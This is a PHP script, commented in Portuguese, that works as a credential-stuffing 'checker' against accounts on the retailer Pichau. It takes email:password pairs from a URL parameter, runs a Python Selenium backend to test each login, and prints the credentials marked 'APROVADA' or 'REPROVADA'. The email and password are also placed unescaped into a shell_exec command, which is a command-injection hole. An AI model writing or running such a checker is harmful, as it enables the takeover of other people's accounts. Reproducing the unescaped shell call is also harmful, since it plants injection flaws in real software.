<?php
/**
 * PICHAU CHECKER API
 * Usa Selenium via Python no backend
 * Uso: api_checker.php?lista=email:senha
 */

header('Content-Type: text/html; charset=utf-8');
error_reporting(0);

// Pega a lista
$lista = $_GET['lista'] ?? '';

if (empty($lista)) {
    die('❌ Erro: Parâmetro "lista" não fornecido. Uso: api_checker.php?lista=email:senha');
}

// Separa email e senha
$separadores = [':', '|', ';', '/'];
$parts = preg_split('/[:|;\/]/', $lista, 2);

if (count($parts) < 2) {
    die('❌ Erro: Formato inválido. Use: email:senha ou email|senha');
}

$email = trim($parts[0]);
$senha = trim($parts[1]);

// Valida email
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die('❌ Erro: Email inválido');
}

echo "🔄 Verificando: <b>$email</b><br>";
echo "⏳ Aguarde...<br><br>";
flush();

// Chama o Python com Selenium
$python_script = __DIR__ . '/checker_backend.py';
$command = "python3 \"$python_script\" \"$email\" \"$senha\"";

// Executa e captura saída
$output = shell_exec($command);

// Processa resultado
if (strpos($output, 'APROVADA') !== false) {
    // Extrai informações
    $parts = explode('|', trim($output));
    $info = isset($parts[1]) ? $parts[1] : '';
    
    echo "<font color='lime'><b>✅ APROVADA</b></font><br>";
    echo "📧 Email: <b>$email</b><br>";
    echo "🔑 Senha: <b>$senha</b><br>";
    if (!empty($info) && $info != 'APROVADA') {
        echo "ℹ️ Info: $info<br>";
    }
    echo "<br>✨ API By Cascade";
    
} elseif (strpos($output, 'REPROVADA') !== false) {
    echo "<font color='red'><b>❌ REPROVADA</b></font><br>";
    echo "📧 Email: <b>$email</b><br>";
    echo "🔑 Senha: <b>$senha</b><br>";
    echo "<br>✨ API By Cascade";
    
} else {
    echo "<font color='orange'><b>⚠️ ERRO</b></font><br>";
    echo "📧 Email: <b>$email</b><br>";
    echo "🔑 Senha: <b>$senha</b><br>";
    echo "💬 Detalhes: " . htmlspecialchars($output) . "<br>";
    echo "<br>✨ API By Cascade";
}
?>
